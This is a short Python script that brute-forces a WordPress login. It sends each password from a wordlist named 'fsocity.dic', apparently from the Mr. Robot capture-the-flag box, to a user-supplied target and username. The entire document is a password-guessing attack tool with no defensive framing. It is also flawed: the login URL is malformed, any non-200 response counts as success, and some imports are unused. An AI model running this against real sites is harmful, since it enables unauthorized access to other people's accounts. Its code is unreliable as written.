import requests
import threading
import time

def bruter(generatedPwd, target, username):
    data = {
        "log": username,
        "pwd": generatedPwd
    }

    r = requests.post("http://"+ target +"wp-login", data=data, timeout=3)

    if r.status_code == 200:
        print("Trying " + generatedPwd + " [+]")
    else:
        print("Success " + generatedPwd + " [+]")
        exit()

target = input("Target Domain or IP : ")
username = input("WP Username : ")


wordlist = open("fsocity.dic", "r+")

for i in reversed(list(wordlist)):
    bruter(i.strip(), target, username)